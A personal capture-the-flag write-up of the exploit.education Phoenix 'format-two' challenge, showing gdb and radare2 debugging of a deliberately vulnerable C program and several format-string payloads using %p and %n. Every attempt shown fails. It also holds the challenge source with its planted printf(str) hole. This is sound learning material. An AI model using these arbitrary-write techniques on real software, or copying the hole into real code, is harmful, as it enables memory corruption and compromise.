# Phoenix format-two
https://exploit.education/phoenix/format-two/
### Result
`Better luck next time!`
### Setup
```
docker start ctf
docker container exec -it ctf bash
```
### Compile code
This is a `format string` challenge using `printf`.  Unlike the **format_one** and **format_zero** challenges:
 - The value to overwrite is not a local variable on the `stack`.
 - Input is provided via `argv[1]`.

```
int changeme;               <-- defined at the "file" level so available inside main() and bounce()

void bounce(char *str) {
      printf(str);          <-- here is the issue!
}

int main(int argc, char **argv) {
  char buf[256];

```
### Finding the changeme variable
##### Get address
`objdump -t format_two | grep changeme`
##### Read address
`0000000000601054 g     O .bss	0000000000000004              changeme`
##### Read sections of binary
This shows the start and end of `bss` memory. It also shows it is `allocated` and `not read-only`.
`main info sec`
##### Disassemble main() in gdb
You can see `changeme` is tested here:
```
0x4006a1 <main+122>       mov    eax, DWORD PTR [rip+0x2009ad]        # 0x601054 <changeme>
0x4006a7 <main+128>       test   eax, eax
0x4006a9 <main+130>       je     0x4006b9 <main+146>
0x4006ab <main+132>       lea    rdi, [rip+0xde]        # 0x400790
```
If you break on `main+128` it is comparing `0` with `0` and then jumps to `Better luck next time!`.

##### Connecting parts together
How do I put the address of the `changeme` variable into `printf(str)`?  I could fill the `str` overflow the buffer.  That would not help, as `changeme` is not on the `stack`.

The `%n` format idea from https://blog.lamarranet.com/index.php/exploit-education-phoenix-format-two-solution/.  `%n` could copy a value into a memory address.  For example:

```
#include <stdio.h>
int main() {
    int num;
    printf("AAAAAAAAA%n\n", &num);    // copies 0x9 into the memory address of 'num'
    return 0;
}
```
### Inspecting the code
This challenge uses more C APIs than previous `format string` challenges.
```
radare2 -A format_two

[0x00400520]> ii
[Imports]
nth vaddr      bind   type   lib name
―――――――――――――――――――――――――――――――――――――
1   0x004004d0 GLOBAL FUNC       strncpy
2   0x004004e0 GLOBAL FUNC       puts
3   0x004004f0 GLOBAL FUNC       printf
4   0x00400500 GLOBAL FUNC       memset
7   0x00400510 GLOBAL FUNC       exit
```

##### Find size of buffer
If you `disassemble main` you can set `memset` is called first.

> void *memset(void *b, int c, size_t len);

If you break on that call, you can get two useful things; the address of `buffer` and the `length` of the buffer.
```
memset@plt (
   $rdi = 0x00007fffffffe440 → 0x0000000000000000,
   $rsi = 0x0000000000000000,
   $rdx = 0x0000000000000100,
   $rcx = 0x00007ffff7af4154 → 0x5477fffff0003d48 ("H="?)
)
```
The third value, the buffer length is represented in hex.  You can see the `buffer` is `256` chars long.
```
gef➤  p/d 0x100
$4 = 256
```
##### Limiting len of user input
Well, not really. But we can check another way.  The second API called is `strncpy`.  This is less famous than `strcpy` which doesn't have that `len` argument to mitigate buffer overflows:

> char * strncpy(char * dst, const char * src, size_t len);

Sidenote - the `memset` call is redundant.  As `strncpy` sets the unused memory to all zeros:

> .... strncpy() functions copy at most len characters from
> src into dst.  If src is less than len characters long, the remainder of
> dst is filled with `\0` characters.

So if we break on `strncpy`.  It was passed:
```
strncpy@plt (
   $rdi = 0x00007fffffffe440 → 0x0000000000000000,
   $rsi = 0x00007fffffffe851 → "%256xAAAAAAAAAAAAAAAA",
   $rdx = 0x0000000000000100        <-- 256 char buffer
)
```
That re-confirms the address of the buffer and it's length of `256` characters.

### Payloads
##### Blind shot
```
gef➤  run $(python -c 'print "%p" + "\x41\x41\x41\x41"')
Welcome to brought to you by https://exploit.education
0x7fffffffe860AAAABetter luck next time!
```
##### Create first payload
Different to the first two format string challenges, you pass in the payload this way:
```
run $(python -c 'print "%268x" + "\x41\x41\x41\x41"')
Better luck next time!
```
##### Why is Payload failing?
`memory watch 0x7fffffffe440 35 qword`
##### Before printf()
```
0x00007fffffffe440│+0x0000   0x4141417836353225   
0x00007fffffffe448│+0x0008   0x4141414141414141   
0x00007fffffffe450│+0x0010   0x0000004141414141   
0x00007fffffffe458│+0x0018   0x0000000000000000   
0x00007fffffffe460│+0x0020   0x0000000000000000   
0x00007fffffffe468│+0x0028   0x0000000000000000   
0x00007fffffffe470│+0x0030   0x0000000000000000   
0x00007fffffffe478│+0x0038   0x0000000000000000
```
##### After printf()
```
0x00007fffffffe440│+0x0000   0x4141417836353225   
0x00007fffffffe448│+0x0008   0x4141414141414141   
0x00007fffffffe450│+0x0010   0x0000004141414141   
0x00007fffffffe458│+0x0018   0x0000000000000000   
0x00007fffffffe460│+0x0020   0x0000000000000000   
0x00007fffffffe468│+0x0028   0x0000000000000000   
0x00007fffffffe470│+0x0030   0x0000000000000000   
0x00007fffffffe478│+0x0038   0x0000000000000000
```
We could inject `format arguments` to try and take the `buffer` beyond `256` characters, using our user input ( which routes the input via `strncpy` ).  But would that really help if the address is not on the `stack`?

### Understanding the user input buffer
##### Fill the 256 char buffer
`run $(python -c 'print "\x41"*256')`
##### Breakpoints
```
1       breakpoint     keep y   memset in main at format_two.c:21
2       breakpoint     keep y   strncpy in main at format_two.c:22
3       breakpoint     keep y   printf in bounce at format_two.c:12
```
##### Fill the 256 char buffer
`run $(python -c 'print "\x41"*256')`
##### Breakpoint fires
Get target memory from `memset` argument one or `p/x $rbp - 0x100`
##### Target register
`0x00007fffffffe350`
##### Watch memory
`memory watch p/x $rbp - 0x100 10 qword`
##### Print each byte
`x/256bx 0x00007fffffffe350`
##### Print only the buffer
`x/64wx 0x00007fffffffe350`
##### Get stack size
`set $stack_size = $rbp - $rsp`         # 272
##### Calculate max overflow
`p/d $stack_size -256`                  # 16
##### Print stack
`x/272wx $rsp`
##### Result
`AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA?@Better luck next time!`

##### Reverse changeme address ( little endian order )
```
# Python 3
>>> s="00601054"
>>> "".join(map(str.__add__, s[-2::-2] ,s[-1::-2]))
54106000
```
### Refined Payloads
##### Use %n
`run $(echo -e "\x54\x10\x60\x00%n")`
##### Get sizeof int type
`p/d sizeof(int)`     # 4
##### Breakpoint on if (changeme != 0)
`x/4bx 0x601054`
##### Result - failed
`0x601054 <changeme>:	0x00	0x00	0x00	0x00`

##### Try new payload ( with %n )
`run $(echo -e "\x54\x10\x60%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%n")`
##### Breakpoint on if (changeme != 0)
`x/4bx 0x601054`
##### Result - failed
`0x601054 <changeme>:	0x00	0x00	0x00	0x00`

##### Find boundary of buffer
`run "AAAA %p %p %p %p %p %p %p %p %p %p %p %p"`
##### Notice the 12th %p starts to wrap (back to Bytes on the Stack )
`AAAA 0x2 (nil) 0x7fffffffe520 (nil) 0x70252070 (nil) 0x7fffffffe420 0x7fffffffe520 0x4006a1 0x7fffffffe608 0x2ffffe560 0x2070252041414141  <--- Better luck next time!`
##### Good news - a Segmentation Fault
`"AAAA %p %p %p %p %p %p %p %p %p %p %p %n"`
##### Backtrace
```
gef➤  backtrace
#0  in _IO_vfprintf_internal (s=0x7ffff7dd0760 <_IO_2_1_stdout_>, format=0x7fffffffe430 "h\230\004\b%p%p%p%p%p%p%p%p%p%p%p%n", ap=ap@entry=0x7fffffffe320) at vfprintf.c:1642
#1  in __printf (format=<optimized out>) at printf.c:33
#2  in bounce (str=0x7fffffffe430 "\020Tb%p%p%p%p%p%p%p%p%p%p%p%n") at format_two.c:12
#3  in main (argc=0x2, argv=0x7fffffffe618) at format_two.c:23
```
##### Bad news - a Segmentation Fault
The string wasn't passed in as we expected:
`\020T%p%p%p%p%p%p%p%p%p%p%p%n")`
##### Null  byte
```
# ./format_two `python -c 'print "\x54\x10\x60\x00"[::-1] + "%p"*11 + "%n"'`
bash: warning: command substitution: ignored null byte in input
Welcome to brought to you by https://exploit.education
Segmentation fault
```
### Source code
```
 /*
 * Can you change the "changeme" variable?
 */

 #include <err.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <unistd.h>

 #define BANNER \
   "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

 int changeme;

 void bounce(char *str) {
   printf(str);
 }

 int main(int argc, char **argv) {
   char buf[256];

   printf("%s\n", BANNER);

   if (argc > 1) {
     memset(buf, 0, sizeof(buf));
     strncpy(buf, argv[1], sizeof(buf));
     bounce(buf);
   }

   if (changeme != 0) {
     puts("Well done, the 'changeme' variable has been changed correctly!");
   } else {
     puts("Better luck next time!\n");
   }

   exit(0);
 }
```
